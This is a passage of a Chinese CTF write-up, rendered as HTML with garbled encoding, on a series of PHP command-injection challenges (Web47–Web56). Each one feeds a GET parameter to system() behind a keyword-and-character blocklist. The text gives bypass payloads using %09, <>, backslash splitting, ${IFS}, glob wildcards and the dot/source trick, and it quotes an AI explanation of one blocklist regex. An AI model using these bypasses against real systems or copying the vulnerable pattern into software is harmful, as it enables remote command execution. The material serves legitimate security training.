|[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº†é™¤äº† tac ä»¥å¤–çš„å¾ˆå¤§ä¸€éƒ¨åˆ†è¯»å–æ–‡ä»¶çš„æ“ä½œï¼Œflag ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œè¿˜æœ‰ç©ºæ ¼å’Œæ˜Ÿå·ï¼Œç»•è¿‡æ–¹å¼å’Œä¸Šä¸€ä¸ªä¸€æ ·ï¼š</p><blockquote><p>c=tac%09fla?.php||</p></blockquote><h1 id="web48"><a class="markdownIt-Anchor" href="#web48">#</a> Web48ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹ä¸æ˜¯ï¼Œæ€ä¹ˆå¤šäº†è¿™ä¹ˆå¤šä¸è®¤è¯†çš„å‘½ä»¤ï¼Ÿ</p><p>â€‹ä¸è¿‡æ— æ‰€è°“ï¼Œå‘ç°è¿˜æ˜¯è€æ ·å­ï¼Œtacã€ç®¡é“ç¬¦å’Œé—®å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œç›´æ¥æ— è„‘å†²ï¼š</p><blockquote><p>c=tac%09fla?.php||</p></blockquote><h1 id="web49"><a class="markdownIt-Anchor" href="#web49">#</a> Web49ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ²¡æœ‰è¿‡æ»¤ tacï¼Œä½†æ˜¯è¿‡æ»¤äº†ç™¾åˆ†å·ï¼Œä¸è¿‡è¿™é‡Œæ— ä¼¤å¤§é›…ï¼Œå› ä¸º %09 ä¸ä¼šè¢«å½“ä½œ %ï¼Œæ‰€ä»¥ç›´æ¥</p><blockquote><p>?c=tac%09fla?.php||</p></blockquote><h1 id="web50"><a class="markdownIt-Anchor" href="#web50">#</a> Web50ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¸¸è¾£ï¼Œè¿‡æ»¤äº† \x09ï¼Œæ²¡æ³•è¿‡äº†ï¼Œé‚£å°±ä½¿ç”¨ &lt;&gt; æ¥ç»•è¿‡ï¼Œä¸è¿‡ï¼Œ&lt;&gt; å’Œé€šé…ç¬¦ï¼Ÿä¸€èµ·ä½¿ç”¨çš„æ—¶å€™ä¸å›æ˜¾ï¼Œæ‰€ä»¥ç”¨åæ–œæ ç»•è¿‡å…³é”®å­— flagï¼š</p><blockquote><p>?c=tac&lt;&gt;fla\g.php||</p></blockquote><h1 id="web51"><a class="markdownIt-Anchor" href="#web51">#</a> Web51ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹é ï¼Œtac è¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡æ— æ‰€è°“ï¼Œsystem å‡½æ•°åœ¨æŸäº›æ—¶å€™å¯ä»¥ç”¨åæ–œæ æ¥åˆ†å‰²å…³é”®å­—ï¼Œç›´æ¥ä¸€æŠŠæ¢­ï¼š</p><blockquote><p>?c=ta\c&lt;&gt;fla\g.php||</p></blockquote><h1 id="web52"><a class="markdownIt-Anchor" href="#web52">#</a> Web52ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹ä¸¸è¾£ï¼Œè¿™é‡Œè¿‡æ»¤äº†å¤§å°äºç¬¦å·ï¼Œä¸è¿‡ï¼Œçªç„¶å‘ç°å¥½åƒæ²¡æœ‰è¿‡æ»¤æ‰ $ ç¬¦å·ï¼Œå¾ˆå¥½ï¼Œç›´æ¥ IFS ç»•è¿‡ã€‚</p><blockquote><p>?c=ta\c${IFS}fla\g.php||</p><p>?c=ta\c${IFS}flâ€™'ag.php||</p></blockquote><p>â€‹ä¸è¿‡æ²¡æœ‰æ‰¾åˆ° flagï¼Œflag ä¼šåœ¨å“ªé‡Œå‘¢ï¼Ÿåœ¨æ ¹ç›®å½•æ‰¾åˆ°äº† flagã€‚</p><h1 id="web53"><a class="markdownIt-Anchor" href="#web53">#</a> Web53ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹æ²¡å•¥è¯´çš„ï¼ŒIFS ç»•è¿‡ä¸€æŠŠæ¢­ï¼š</p><blockquote><p>?c=ta\c${IFS}fla\g.php</p></blockquote><h1 id="web54"><a class="markdownIt-Anchor" href="#web54">#</a> Web54ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™åˆæ˜¯å•¥æ­£åˆ™ï¼Ÿai çš„è§£é‡Šå¦‚ä¸‹ï¼ˆéƒ¨åˆ†æ­£ç¡®ï¼Œä¸å¯å…¨ä¿¡ï¼‰ï¼š</p><blockquote><p>è¿™è¡Œä»£ç æ˜¯ä½¿ç”¨ PHP çš„ <code>preg_match</code>  å‡½æ•°æ¥æ£€æŸ¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆå‡è®¾ä¸ºå˜é‡ <code>$c</code> ï¼‰æ˜¯å¦åŒ…å«ä¸€ç³»åˆ—ç‰¹å®šçš„æ¨¡å¼æˆ–å­—ç¬¦ã€‚è¿™äº›æ¨¡å¼é€šå¸¸ä¸å°è¯•ç»•è¿‡å®‰å…¨é™åˆ¶ã€æ³¨å…¥æ¶æ„ä»£ç æˆ–æ‰§è¡Œä¸æœŸæœ›çš„å‘½ä»¤æœ‰å…³ã€‚ä¸‹é¢æ˜¯å¯¹è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¸­å„ä¸ªéƒ¨åˆ†çš„è§£é‡Šï¼š</p><ol><li><code>\;</code> ï¼šæŸ¥æ‰¾åˆ†å·ï¼ˆ <code>;</code> ï¼‰ï¼Œè¿™é€šå¸¸ç”¨äºå‘½ä»¤åˆ†éš”ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å¯èƒ½è¢«ç”¨äºå°è¯•æ‰§è¡Œå¤šæ¡å‘½ä»¤ã€‚</li><li><code>.*c.*a.*t.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>cat</code>  çš„å­—ç¬¦ä¸²ï¼Œ <code>cat</code>  æ˜¯ä¸€ä¸ªå¸¸ç”¨äº Unix/Linux ç³»ç»Ÿä¸­æŸ¥çœ‹æ–‡ä»¶å†…å®¹çš„å‘½ä»¤ã€‚</li><li><code>.*f.*l.*a.*g.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>flag</code>  çš„å­—ç¬¦ä¸²ï¼Œè¿™å¯èƒ½æ˜¯åœ¨å°è¯•è·å–æŸç§ â€œæ ‡å¿—â€ æˆ–æ•æ„Ÿä¿¡æ¯ã€‚</li><li><code> [0-9]</code> ï¼šæŸ¥æ‰¾ç©ºæ ¼åè·Ÿä»»ä½•æ•°å­—ï¼Œè¿™å¯èƒ½æ˜¯åœ¨å°è¯•ç»•è¿‡åŸºäºç‰¹å®šå­—ç¬¦çš„é™åˆ¶ã€‚</li><li><code>\*</code> ï¼šæŸ¥æ‰¾æ˜Ÿå·ï¼ˆ <code>*</code> ï¼‰ï¼Œåœ¨æŸäº›ä¸Šä¸‹æ–‡ä¸­ï¼Œå®ƒå¯èƒ½ç”¨äºé€šé…ç¬¦åŒ¹é…æˆ–å…·æœ‰ç‰¹æ®Šæ„ä¹‰ã€‚</li><li><code>.*m.*o.*r.*e.*</code> ã€ <code>.*w.*g.*e.*t.*</code> ã€ <code>.*l.*e.*s.*s.*</code>  ç­‰ï¼šè¿™äº›æ¨¡å¼åˆ†åˆ«æŸ¥æ‰¾åŒ…å« <code>more</code> ã€ <code>wget</code> ã€ <code>less</code>  ç­‰å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼Œè¿™äº›å‘½ä»¤é€šå¸¸ç”¨äºæ–‡ä»¶æ“ä½œæˆ–æ•°æ®ä¼ è¾“ã€‚</li><li><code>.*h.*e.*a.*d.*</code> ã€ <code>.*s.*o.*r.*t.*</code> ã€ <code>.*t.*a.*i.*l.*</code>  ç­‰ï¼šæŸ¥æ‰¾åŒ…å« <code>head</code> ã€ <code>sort</code> ã€ <code>tail</code>  ç­‰ Unix/Linux å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼Œè¿™äº›å‘½ä»¤ç”¨äºå¤„ç†æ–‡æœ¬æ•°æ®ã€‚</li><li><code>.*s.*e.*d.*</code> ã€ <code>.*c.*u.*t.*</code> ã€ <code>.*t.*a.*c.*</code>  ç­‰ï¼šæŸ¥æ‰¾åŒ…å« <code>sed</code> ã€ <code>cut</code> ã€ <code>tac</code>  ç­‰å‘½ä»¤çš„å­—ç¬¦ä¸²ï¼Œè¿™äº›å‘½ä»¤ç”¨äºæ–‡æœ¬å¤„ç†ã€‚</li><li><code>.*a.*w.*k.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>awk</code>  çš„å­—ç¬¦ä¸²ï¼Œ <code>awk</code>  æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡æœ¬å¤„ç†å·¥å…·ã€‚</li><li><code>.*s.*t.*r.*i.*n.*g.*s.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>strings</code>  çš„å­—ç¬¦ä¸²ï¼Œ <code>strings</code>  å‘½ä»¤ç”¨äºæå–äºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„å¯æ‰“å°å­—ç¬¦ä¸²ã€‚</li><li><code>.*o.*d.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>od</code>  çš„å­—ç¬¦ä¸²ï¼Œ <code>od</code> ï¼ˆå…«è¿›åˆ¶è½¬å‚¨ï¼‰å‘½ä»¤ç”¨äºä»¥å…«è¿›åˆ¶æˆ–å…¶ä»–æ ¼å¼è½¬å‚¨æ–‡ä»¶å†…å®¹ã€‚</li><li><code>.*c.*u.*r.*l.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>curl</code>  çš„å­—ç¬¦ä¸²ï¼Œ <code>curl</code>  æ˜¯ä¸€ä¸ªç”¨äºä¼ è¾“æ•°æ®çš„å‘½ä»¤è¡Œå·¥å…·ã€‚</li><li><code>.*n.*l.*</code> ï¼šå¯èƒ½æ„å›¾æŸ¥æ‰¾åŒ…å« <code>nl</code>  çš„å­—ç¬¦ä¸²ï¼Œä½†æ­¤æ¨¡å¼è¾ƒä¸ºå®½æ³›ï¼Œå› ä¸º <code>n</code>  å’Œ <code>l</code>  æ˜¯å¸¸è§å­—æ¯ã€‚</li><li><code>.*s.*c.*p.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>scp</code>  çš„å­—ç¬¦ä¸²ï¼Œ <code>scp</code>  æ˜¯å®‰å…¨å¤åˆ¶å‘½ä»¤ï¼Œç”¨äºåœ¨æœ¬åœ°å’Œè¿œç¨‹ä¹‹é—´å®‰å…¨åœ°ä¼ è¾“æ–‡ä»¶ã€‚</li><li><code>.*r.*m.*</code> ï¼šæŸ¥æ‰¾åŒ…å« <code>rm</code>  çš„å­—ç¬¦ä¸²ï¼Œ <code>rm</code>  å‘½ä»¤ç”¨äºåˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ã€‚</li><li><code>\</code> ã€ <code>%</code> ã€ <code>\x09</code> ã€ <code>\x26</code> ã€ <code>&gt;</code> ã€ <code>&lt;</code> ï¼šæŸ¥æ‰¾åå¼•å·ï¼ˆ```ï¼‰ã€ç™¾åˆ†å·ï¼ˆ <code>%</code> ï¼‰ã€åˆ¶è¡¨ç¬¦ï¼ˆ <code>\x09</code> ï¼‰ã€ <code>&amp;</code>  ç¬¦å·çš„ HTML å®ä½“ï¼ˆ <code>\x26</code> ï¼‰ã€å¤§äºå·ï¼ˆ <code>&gt;</code> ï¼‰ã€å°äºå·ï¼ˆ <code>&lt;</code> ï¼‰ï¼Œè¿™äº›å­—ç¬¦æˆ–æ¨¡å¼å¯èƒ½åœ¨å°è¯•æ‰§è¡Œå‘½ä»¤æˆ–æ³¨å…¥ä»£ç æ—¶å…·æœ‰ç‰¹æ®Šæ„ä¹‰ã€‚</li></ol><p>æ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨äº† <code>i</code>  ä¿®é¥°ç¬¦ï¼Œè¡¨ç¤ºä¸åŒºåˆ†å¤§å°å†™ã€‚å¦‚æœ <code>preg_match</code>  è¿”å› <code>false</code> ï¼ˆå³æ²¡æœ‰æ‰¾åˆ°åŒ¹é…é¡¹ï¼‰ï¼Œåˆ™æ„å‘³ç€å­—ç¬¦ä¸² <code>$c</code>  ä¸åŒ…å«ä¸Šè¿°ä»»ä½•æ•æ„Ÿæ¨¡å¼æˆ–å­—ç¬¦ã€‚è¿™é€šå¸¸ç”¨äºå®‰å…¨æ£€æŸ¥ï¼Œä»¥é˜²æ­¢æ½œåœ¨çš„æ¶æ„è¾“å…¥ã€‚</p></blockquote><p>â€‹è¿™é‡Œç›´æ¥ç”¨ä¸‹é¢è¿™ä¸ªæ–¹å¼ç»•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=grep$&#123;IFS&#125;<span class="string">&#x27;&#123;&#x27;</span>$&#123;IFS&#125;fl???php</span><br><span class="line">ï¼ˆåœ¨ fl???phpåŒ¹é…åˆ°çš„æ–‡ä»¶ä¸­ï¼ŒæŸ¥æ‰¾å«æœ‰&#123;çš„æ–‡ä»¶ï¼Œå¹¶æ‰“å°å‡ºåŒ…å« &#123; çš„è¿™ä¸€è¡Œï¼‰</span><br></pre></td></tr></table></figure><h1 id="web55"><a class="markdownIt-Anchor" href="#web55">#</a> Web55ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹ç»ˆäºåˆ°äº†æ–°ç©æ„å„¿äº†ï¼Œæ— å­—æ¯ RCEï¼Œæœ‰å‡ ç§æ–¹æ³•ï¼š<br>æŸ¥çœ‹æºä»£ç å‘ç°æ²¡æœ‰è¿‡æ»¤æ•°å­—ï¼Œæˆ‘ä»¬å°±æƒ³ä¸€æƒ³åœ¨æˆ‘ä»¬æŸ¥çœ‹æ–‡ä»¶çš„å‘½ä»¤æœ‰æ²¡æœ‰æ•°å­—å¼€å¤´çš„ã€‚<br>åŒ¹é…åˆ° /bin ç›®å½•ä¸‹çš„å‘½ä»¤<br> catã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarã€base64 ç­‰<br>å‘ç°å­˜åœ¨ä¸€ä¸ª base64<br> æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡é€šé…ç¬¦è¿›è¡ŒåŒ¹é…å‘½ä»¤æ‰§è¡ŒæŸ¥çœ‹ flag.php<br>payloadï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=/???/????64 ????.???</span><br><span class="line">æ„æ€æ˜¯ /bin/base64 flag.php</span><br></pre></td></tr></table></figure><h1 id="web56"><a class="markdownIt-Anchor" href="#web56">#</a> Web56ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">è§£é¢˜æ€è·¯ï¼šè¿‡æ»¤äº†åˆ†å·ï¼Œå­—æ¯ï¼Œæ•°å­—ç­‰ç­‰ç¬¦å·</span><br><span class="line">æœ¬é¢˜æ²¡æœ‰è¿‡æ»¤ç¬¦å·.(ç‚¹)ï¼Œå› æ­¤å¯ä»¥æƒ³åˆ°linuxä¸­è¯¥ç¬¦å·.(ç‚¹)çš„ç”¨æ³•ï¼Œä¸sourceå‘½ä»¤ç”¨æ³•ç›¸åŒï¼šlinxuä¸­sourceå‘½ä»¤å’Œ.(ç‚¹)</span><br><span class="line">æ€»ä½“åˆ†æåï¼Œå¯ä»¥postä¸Šä¼ ä¸€ä¸ªphpæ–‡ä»¶ï¼Œå†…å®¹ä¸ºæ‰€éœ€æ‰§è¡Œçš„linuxæŒ‡ä»¤ï¼Œç„¶åä½¿ç”¨globé€šé…ç¬¦å’Œ.(ç‚¹)æ¥å°†å…¶ä¸­çš„å†…å®¹ä»¥linuxæŒ‡ä»¤çš„å½¢å¼æ¥è¿›è¡Œæ‰§è¡Œã€‚</span><br></pre></td></tr></table></figure><p>â€‹è¿˜æ˜¯ systemï¼Œä¸è¿‡è¿™æ¬¡å¤šè¿‡æ»¤äº†å­—æ¯ã€‚ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬å»è·‘ï¼Œä¸è¿‡åŸç†ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œè´´ä¸€ä¸ªé“¾æ¥ï¼Œæœ‰æ¡ä»¶å°±å»å­¦ä¹ ä¸€ä¸‹ã€‚</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnNpbmEuY29tLmNuL3MvYmxvZ19hZjY4YTJjMjAxMDE2bmgyLmh0bWw=">LINUX ä¸­çš„ç‚¹å‘½ä»¤ï¼Œæˆ– source å‘½ä»¤ï¼Œæˆ–ç‚¹ç¬¦å·</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vd2Vic2hlbGwtd2l0aG91dC1hbHBoYW51bS1hZHZhbmNlZC5odG1s">æ— å­—æ¯æ•°å­— webshell ä¹‹æé«˜ç¯‡</span></p><p>â€‹python è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span 